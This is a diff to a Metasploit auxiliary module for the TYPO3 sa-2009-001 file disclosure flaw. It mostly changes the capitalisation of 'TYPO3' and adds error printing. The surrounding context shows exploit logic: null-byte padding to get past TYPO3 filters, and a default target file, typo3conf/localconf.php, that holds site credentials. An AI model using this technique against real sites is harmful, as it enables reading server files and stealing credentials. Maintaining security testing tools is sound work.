@@ -18,10 +18,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'			=> 'Typo3 sa-2009-001 Weak Encryption Key File Disclosure',
+			'Name'			=> 'TYPO3 sa-2009-001 Weak Encryption Key File Disclosure',
 			'Version'		=> '$Revision$',
 			'Description'	=> %q{
-				This module exploits a flaw in Typo3 encryption ey creation process to allow for
+				This module exploits a flaw in TYPO3 encryption ey creation process to allow for
 				file disclosure in the jumpUrl mechanism. This flaw can be used to read any file
 				that the web server user account has access to view.
 			},
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('URI', [true, "Typo3 Path", "/"]),
+				OptString.new('URI', [true, "TYPO3 Path", "/"]),
 				OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
 				OptString.new('ENC_KEY', [false, "Encryption key if known", '']),
 			], self.class)
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 
-	# Add padding to bypass Typo3 security filters
+	# Add padding to bypass TYPO3 security filters
 	#
 	# Null byte fixed in PHP 5.3.4
 	#
@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
 		jumpurl = "#{datastore['RFILE']}%00/."
 		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
 		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
-		print_status("Adding padding to end of #{datastore['RFILE']} to avoid Typo3 security filters")
+		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
 	when /^..(\/|\\)/i
 		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
 	else
@@ -120,8 +120,8 @@ class Metasploit3 < Msf::Auxiliary
 			},25)
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE
-
+		rescue ::Timeout::Error, ::Errno::EPIPE => e
+			print_error(e.message)
 		end
 
 		case file.headers['Content-Type']
